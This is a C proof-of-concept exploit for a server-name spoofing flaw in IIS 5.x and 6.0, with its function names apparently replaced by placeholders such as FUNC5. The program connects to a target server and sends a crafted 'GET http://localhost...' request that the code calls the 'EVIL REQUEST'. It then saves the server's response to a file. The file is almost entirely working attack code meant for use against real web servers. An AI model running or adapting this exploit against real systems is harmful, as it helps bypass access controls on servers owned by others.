#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int Conectado ; 
 int LEN_BUF ; 
 int /*<<< orphan*/  FUNC0 () ; 
 scalar_t__ FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC3 (char*,char*) ; 
 int /*<<< orphan*/  FUNC4 (char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 size_t FUNC6 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (int,char*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 

int FUNC11(int argc, char *argv[])
{
	/*connect to a host throught a port*/
	int FUNC12(char *Host, short puerto);
	//socket from the connection
	int socket;
	//to get the data received
	char buf[LEN_BUF];
	FILE *data;

	FUNC5("\n                 Proof of Concept");
	FUNC5("\n IIS 5.x and IIS 6.0 Server Name Spoof - by Lympex");
	FUNC5("\nContact: lympex[at]gmail[dot]com - http://l-bytes.tk");
	FUNC5("\n----------------------------------------------------\n");

	if(argc!=4)
	{
		FUNC5("\n[+] Usage: %s server.com 80 /test.asp\n",argv[0]);return;
	}

	//conectamos
	socket=FUNC12(argv[1],(short)FUNC1(argv[2]));

	if(socket==-1)
	{
		FUNC5("\n[+] Error connecting to host\n");
		return;
	}FUNC5("\n[+] Connected!\n");

	if((data=FUNC3("received_data.txt","w"))==NULL)
	{
		FUNC5("\n[+] Error saving received data\n");
		FUNC0();
		return;
	}

	/*send the EVIL REQUEST*/
	FUNC9(buf,"GET http://localhost");FUNC8(buf,argv[3]);FUNC8(buf," HTTP/1.0\n\n");
	FUNC7(socket,buf,FUNC10(buf),0);

	//while we arenÂ´t disconnected
	do
	{
		buf[FUNC6(socket,buf,LEN_BUF,0)]='\0';
		FUNC4(buf,data);
	}while(socket==Conectado);

	FUNC0();
	FUNC2(data);
	FUNC5("\n[+] Received data, saved in: \x22received_data.txt\x22\n");
	return;
}